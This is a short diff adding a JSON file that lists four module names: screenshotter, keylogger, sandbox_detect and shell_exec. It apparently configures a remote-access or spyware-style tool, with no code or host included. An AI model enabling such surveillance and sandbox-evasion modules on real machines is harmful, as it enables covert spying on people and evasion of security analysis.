@@ -1,0 +1,14 @@
+[
+    {
+        "module": "screenshotter"
+    },
+    {
+        "module": "keylogger"
+    },
+    {
+        "module": "sandbox_detect"
+    },
+    {
+        "module": "shell_exec"
+    }
+]
